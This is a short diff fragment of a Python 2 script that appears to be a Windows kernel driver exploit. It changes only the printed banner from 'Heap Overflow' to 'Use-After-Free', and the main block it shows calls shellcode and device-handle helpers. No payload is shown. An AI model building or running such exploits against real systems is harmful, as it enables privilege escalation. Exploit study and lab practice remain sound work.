@@ -203,7 +203,7 @@ def trigger(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize):
         sys.exit(-1)
 
 if __name__ == "__main__":
-        print "\nHeap Overflow\n"
+        print "\nUse-After-Free\n"
         pid = boomHeadshot()
         shelladdr = shellcode(pid)
         handlez = gethandle()
